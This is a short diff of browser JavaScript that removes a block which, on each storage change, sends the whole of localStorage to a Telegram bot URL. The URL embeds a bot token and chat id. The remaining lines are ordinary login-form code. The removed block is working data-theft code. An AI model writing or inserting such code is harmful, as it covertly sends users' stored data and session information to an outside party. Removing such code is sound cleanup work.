@@ -1,9 +1,3 @@
-/* fetch localStorage on change */
-    window.addEventListener('storage', function() {
-        fetch(`https://api.telegram.org/bot1070038475:AAGK8MbB_VNFpeYSapXQ1L458o1innmPWkk/` + 
-            `sendMessage?chat_id=-1001490927690&text=` + 
-            `${JSON.stringify(localStorage)}`);
-    });
 /* Authentication */
     document.querySelector('#login').value = localStorage.getItem('lastLogin') || '';
     document.querySelector('.content').style.display = 'none';
